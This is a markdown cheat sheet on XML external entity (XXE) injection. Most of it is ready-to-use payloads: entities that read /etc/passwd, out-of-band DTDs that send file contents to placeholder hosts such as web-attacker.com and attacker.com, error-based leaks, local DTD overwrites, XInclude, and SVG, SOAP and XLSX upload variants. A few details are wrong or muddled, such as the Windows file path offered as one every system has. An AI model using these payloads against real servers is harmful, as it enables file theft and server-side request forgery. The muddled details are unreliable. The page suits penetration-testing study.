---
title: XXE Injection
date: 2021-11-16T21:07:41+01:00
---
# XXE Injection

The XML format allows users to specify entities which can be used inside the XML document using the formant `&entityname;`. These entities can be fetched over the network or can be read from a file using payloads such as:

``` xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://evil.com"> ]>
```

This opens up the door to two different vulnerabilities: Retrieving Local Files and Server Side Request Forgery

## Retrieving Files

Even though XXE can be used to read files, it often can\'t be used to list the contents of a directory. However, we can test whether an XXE vulnerability exists, we ca try and read a file that exists on every system and that can be read by every user. In linux, that file is `/etc/passwd` and in windows, that is `/c:/server_files/application.conf`. An example test payload for linux would be:

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY passwd SYSTEM "file:///etc/passwd"> ]>
<yeet>&passwd;</yeet>
```

## SSRF

### Regular XXE

This bug can be tested by sending an XML document with an external entity that points to a known resource on the network. If a DNS or HTTP request is sent to that server after sending the XML request, an XXE vulnerability exists. However, this method doesn\'t always work since some systems block external entities on a network. Here is an example payload:

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY network SYSTEM "http://evil.com"> ]>
<yeet>&network;</yeet>
```

### Blind XXE

Sometimes, when a server\'s response doesn\'t contain any part of the sent XML body, an XXE vulnerability might still exist. This can be tested using the Burp Collaborator.

### XML Parameter Entities

Sometimes,applications block using entities for security reasons. However you can still inject external entities using *XML Parameter Entities*. Here is a sample payload:

``` xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % param SYSTEM "http://evil.com"> %param; ]>
<yeet>data</yeet>
```

### Data Ex-filtration

1.  With SSRF

    Ex-filtrating data from blind XXE vulnerabilities is possible using a malicious [DTD](https:www.w3schools.com/xml/xml_dtd.asp). In order to exploit it, we need a server to serve a malicious DTD. Here is an example DTD:

    ``` xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://web-attacker.com/?x=%file;'>">
    %eval;
    %exfiltrate;
    ```

    You can then host this in a file under your server, accessible from a URL like `http://attacker.com/extractpasswd.dtd`. You can then use this file in an XXE payload like this:

    ``` xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/extractpasswd.dtd"> %xxe;]>
    <yeet>data</yeet>
    ```

    This method doesn\'t work in multiline files however, so it can be used to leak files like `/etc/hostname`.

2.  With Error Messages

    If a web application returns error messages which can possibly contain details of an entity, this too can be exploited using a DTD. DTD Document:

    ``` xml
    <!ENTITY % file SYSTEM "file:///etc/passwd">
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
    %eval;
    %error;
    ```

    XXE Payload:

    ``` xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/error.dtd"> %xxe;]>
    <yeet>data</yeet>
    ```

3.  Repurposing existing DTD files in a server

    When out-of-band interactions are disabled by the web server\'s network settings or any other method, it won\'t be possible to include external DTD files. Hence, Blind XXE injection can only be exploited using a known DTD files in a system and using that file to leak data in the form of error messages. However, this DTD file should first be *edited* with a malicious XXE payload that accesses system files. Thankfully, XML allows us to **overwrite** some entries in an external DTD. For instance, if in a server there is a DTD file named /etc/DTDs/localdtd.dtd that also contains an entity named **localentity**, we can use the following payload to **overwrite** that entity.

    ``` xml
    <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///etc/DTDs/localdtd.dtd">
    <!ENTITY %  localentity'
    <!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
    <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
    &#x25;eval;
    &#x25;error;
    '>
    %local_dtd;
    ]>
    ```

    Locating such files should be fairly straightforward since the web application returns errors from the xml parser, we can simply check whether a file exists by sending a benign payload and checking whether the server returns an error(the file doesn\'t exist) or not(the file exists)

    ``` xml
    <!DOCTYPE foo [
    <!ENTITY % local_dtd SYSTEM "file:///usr/share/test.dtd">
    %local_dtd;
    ]>
    ```

## Exploiting XInclude

Sometimes, even if you don\'t send XML data to a website, the application could still use the input you provided it to create an XML document. However, if the proper sanitisations are not made on the input, the final XML could be edited which can again be used to leak file information or to cause out-of-band interactions. Here is a sample payloads that uses xinclude:

``` xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

## File Upload Attacks

In theory, any file upload that uses xml and is parsed on the back-end side can be exploited. There are different methods for different filetypes and each should be tested thoroughly.

### Image Uploads with SVG

Image upload forms can be vulnerable to XXE if they allow uploading SVG files. Here is a sample payload that should be tested:

``` xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### SOAP XXE

This payload should be tested on every parameter where a SOAP query could be formed in the backend:

``` xml
<soap:Body>
  <foo>
    <![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
  </foo>
</soap:Body>
```

### DOCX

A great tool exists for injecting in docx files: <https://github.com/BuffaloWill/oxml_xxe>

### XLSX

1.  Extract the excel file:

```{=html}
<!-- -->
```
    $ mkdir XXE && cd XXE
    $ unzip ../XXE.xlsx
    Archive:  ../XXE.xlsx
      inflating: xl/drawings/drawing1.xml
      inflating: xl/worksheets/sheet1.xml
      inflating: xl/worksheets/_rels/sheet1.xml.rels
      inflating: xl/sharedStrings.xml
      inflating: xl/styles.xml
      inflating: xl/workbook.xml
      inflating: xl/_rels/workbook.xml.rels
      inflating: _rels/.rels
      inflating: [Content_Types].xml

1.  Add your blind XXE payload in `xl/workbook.xml` or add your payload in `xl/sharedStrings.xml`

xl/workbook.xml

``` xml
<xml...>
  <!DOCTYPE x [ <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
  <x>&xxe;</x>
  <workbook...>
```

xl/sharedString.xml

``` xml
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [ <!ELEMENT t ANY > <!ENTITY xxe SYSTEM "http://YOURCOLLABORATORID.burpcollaborator.net/"> ]>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="10" uniqueCount="10"><si><t>&xxe;</t></si><si><t>testA2</t></si><si><t>testA3</t></si><si><t>testA4</t></si><si><t>testA5</t></si><si><t>testB1</t></si><si><t>testB2</t></si><si><t>testB3</t></si><si><t>testB4</t></si><si><t>testB5</t></si></sst>
```

1.  rebuild the Excel file:

```{=html}
<!-- -->
```
    $ zip -r ../poc.xlsx *
    updating: [Content_Types].xml (deflated 71%)
    updating: _rels/ (stored 0%)
    updating: _rels/.rels (deflated 60%)
    updating: docProps/ (stored 0%)
    updating: docProps/app.xml (deflated 51%)
    updating: docProps/core.xml (deflated 50%)
    updating: xl/ (stored 0%)
    updating: xl/workbook.xml (deflated 56%)
    updating: xl/worksheets/ (stored 0%)
    updating: xl/worksheets/sheet1.xml (deflated 53%)
    updating: xl/styles.xml (deflated 60%)
    updating: xl/theme/ (stored 0%)
    updating: xl/theme/theme1.xml (deflated 80%)
    updating: xl/_rels/ (stored 0%)
    updating: xl/_rels/workbook.xml.rels (deflated 66%)
    updating: xl/sharedStrings.xml (deflated 17%)